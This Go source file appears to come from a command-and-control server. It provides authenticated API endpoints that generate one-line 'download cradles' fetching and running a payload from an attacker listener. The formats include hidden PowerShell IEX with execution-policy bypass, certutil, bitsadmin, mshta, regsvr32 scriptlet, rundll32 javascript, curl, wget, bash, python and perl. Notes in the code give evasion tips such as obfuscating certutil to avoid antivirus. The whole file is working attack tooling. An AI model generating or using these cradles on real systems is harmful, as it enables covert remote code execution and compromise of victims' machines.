package server

import (
	"encoding/json"
	"fmt"
	"net/http"
	"strings"
)

// CradleRequest holds the parameters for generating a download cradle.
type CradleRequest struct {
	ListenerURL string `json:"listener_url"` // e.g. "https://192.168.1.1:443"
	PayloadPath string `json:"payload_path"` // e.g. "/download/abc123"
	Format      string `json:"format"`       // powershell, certutil, curl, wget, bitsadmin, python, mshta, regsvr32
	OutFile     string `json:"out_file"`     // output filename on target
	Proxy       string `json:"proxy"`        // optional proxy URL
}

// CradleResponse contains the generated one-liner.
type CradleResponse struct {
	Format  string `json:"format"`
	Cradle  string `json:"cradle"`
	FullURL string `json:"full_url"`
	Notes   string `json:"notes"`
}

// GenerateCradle creates a one-liner download cradle for the given configuration.
func GenerateCradle(req CradleRequest) CradleResponse {
	url := strings.TrimRight(req.ListenerURL, "/") + "/" + strings.TrimLeft(req.PayloadPath, "/")
	outFile := req.OutFile
	if outFile == "" {
		outFile = "payload.exe"
	}

	var cradle, notes string

	switch strings.ToLower(req.Format) {
	case "powershell", "ps1", "ps":
		if strings.HasSuffix(outFile, ".ps1") || strings.HasSuffix(outFile, ".txt") {
			// Script execution (IEX)
			cradle = fmt.Sprintf(`powershell -nop -w hidden -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('%s')"`, url)
			notes = "Executes script in-memory. No file written to disk."
		} else {
			// Binary download + execute
			proxyLine := ""
			if req.Proxy != "" {
				proxyLine = fmt.Sprintf(`$p=New-Object Net.WebProxy('%s');$wc.Proxy=$p;`, req.Proxy)
			}
			cradle = fmt.Sprintf(`powershell -nop -w hidden -ep bypass -c "$wc=New-Object Net.WebClient;%s$wc.DownloadFile('%s','%s');Start-Process '%s'"`,
				proxyLine, url, outFile, outFile)
			notes = "Downloads to disk and executes. Consider using -WindowStyle Hidden."
		}

	case "powershell_iwr":
		cradle = fmt.Sprintf(`powershell -nop -w hidden -ep bypass -c "Invoke-WebRequest -Uri '%s' -OutFile '%s' -UseBasicParsing; & '.\\%s'"`,
			url, outFile, outFile)
		notes = "Uses Invoke-WebRequest (PowerShell 3.0+)."

	case "certutil":
		cradle = fmt.Sprintf(`certutil -urlcache -split -f %s %s && %s`, url, outFile, outFile)
		notes = "Uses certutil LOLBin. May trigger AV signatures. Consider using certutil -decode for obfuscation."

	case "curl":
		proxyFlag := ""
		if req.Proxy != "" {
			proxyFlag = fmt.Sprintf(" -x %s", req.Proxy)
		}
		cradle = fmt.Sprintf(`curl -k -s -o %s %s%s && chmod +x %s && ./%s`, outFile, url, proxyFlag, outFile, outFile)
		notes = "Linux/macOS. -k skips TLS verification."

	case "wget":
		proxyEnv := ""
		if req.Proxy != "" {
			proxyEnv = fmt.Sprintf("https_proxy=%s ", req.Proxy)
		}
		cradle = fmt.Sprintf(`%swget --no-check-certificate -q -O %s %s && chmod +x %s && ./%s`, proxyEnv, outFile, url, outFile, outFile)
		notes = "Linux/macOS. --no-check-certificate skips TLS verification."

	case "bitsadmin":
		cradle = fmt.Sprintf(`bitsadmin /transfer rtlc2 /download /priority high %s %%TEMP%%\\%s && %%TEMP%%\\%s`, url, outFile, outFile)
		notes = "Windows BITS transfer. Runs as background job. May be slow."

	case "python", "python3":
		cradle = fmt.Sprintf(`python3 -c "import urllib.request,os,tempfile;p=os.path.join(tempfile.gettempdir(),'%s');urllib.request.urlretrieve('%s',p);os.chmod(p,0o755);os.system(p)"`,
			outFile, url)
		notes = "Cross-platform Python 3. Writes to temp directory."

	case "mshta":
		// mshta with VBScript to download and execute
		cradle = fmt.Sprintf(`mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -nop -w hidden -ep bypass -c """"IEX(New-Object Net.WebClient).DownloadString('%s')"""" "":close")`, url)
		notes = "Windows only. Uses mshta LOLBin to launch PowerShell."

	case "regsvr32":
		cradle = fmt.Sprintf(`regsvr32 /s /n /u /i:%s scrobj.dll`, url)
		notes = "Windows only. Requires URL to serve a .sct (scriptlet) file."

	case "rundll32":
		cradle = fmt.Sprintf(`rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%%20ActiveXObject("WScript.Shell").Run("powershell -nop -w hidden -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('%s')")`, url)
		notes = "Windows only. Uses rundll32 with JavaScript."

	case "bash":
		cradle = fmt.Sprintf(`bash -c 'curl -sk %s -o /tmp/%s && chmod +x /tmp/%s && /tmp/%s &'`, url, outFile, outFile, outFile)
		notes = "Linux. Runs in background."

	case "perl":
		cradle = fmt.Sprintf(`perl -e 'use LWP::Simple;getstore("%s","/tmp/%s");chmod 0755,"/tmp/%s";exec"/tmp/%s"'`, url, outFile, outFile, outFile)
		notes = "Linux/macOS. Requires LWP::Simple module."

	default:
		cradle = fmt.Sprintf(`curl -k -s -o %s %s && chmod +x %s && ./%s`, outFile, url, outFile, outFile)
		notes = "Default curl-based cradle."
	}

	return CradleResponse{
		Format:  req.Format,
		Cradle:  cradle,
		FullURL: url,
		Notes:   notes,
	}
}

// GetAvailableCradleFormats returns all supported cradle format names.
func GetAvailableCradleFormats() []string {
	return []string{
		"powershell", "powershell_iwr", "certutil", "curl", "wget",
		"bitsadmin", "python", "mshta", "regsvr32", "rundll32",
		"bash", "perl",
	}
}

// ===================== HTTP Handlers =====================

// RegisterCradleRoutes registers cradle generation API endpoints.
func RegisterCradleRoutes(mux *http.ServeMux, authMiddleware func(http.HandlerFunc) http.HandlerFunc) {
	mux.HandleFunc("/api/v1/cradles/generate", authMiddleware(handleGenerateCradle))
	mux.HandleFunc("/api/v1/cradles/formats", authMiddleware(handleCradleFormats))
}

func handleGenerateCradle(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		jsonError(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var req CradleRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		jsonError(w, "invalid request body", http.StatusBadRequest)
		return
	}

	if req.ListenerURL == "" {
		jsonError(w, "listener_url is required", http.StatusBadRequest)
		return
	}
	if req.Format == "" {
		req.Format = "powershell"
	}

	result := GenerateCradle(req)
	jsonResponse(w, result)
}

func handleCradleFormats(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		jsonError(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	jsonResponse(w, map[string]interface{}{"formats": GetAvailableCradleFormats()})
}
